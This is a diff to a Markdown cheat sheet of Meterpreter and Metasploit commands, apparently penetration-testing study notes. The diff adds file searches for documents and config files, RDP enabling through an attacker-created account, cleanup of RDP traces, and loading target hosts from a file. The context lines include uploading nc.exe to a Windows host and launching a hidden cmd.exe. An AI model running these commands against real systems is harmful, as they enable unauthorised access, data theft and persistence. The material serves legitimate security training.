@@ -89,6 +89,8 @@ upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec
 download c:\\Windows\\system32\\calc.exe /tmp/calc.exe
 edit edit.txt
 search -f autoexec.bat
+search -f *.docx
+serach -f config*
 execute -f cmd.exe -i -H
 ```
 
@@ -112,6 +114,26 @@ meterpreter > transport next
 [*] Sending stage (179779 bytes) to 10.11.0.22
 [+] Successfully changed to the next transport, killing current session.
 msf5 exploit(multi/handler) > sessions -i 6
+```
+
+### Other useful commands
+
+Enable RDP:
+
+```
+meterpreter > run getgui -u rosesecurity -p password
+```
+
+Cleanup RDP:
+
+```
+meterpreter > run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
+```
+
+Run modules against file of hosts:
+
+```
+msf6> set RHOSTS file:/tmp/nmap_output_hosts.txt
 ```
 
 ### Post-Exploitation with Metasploit
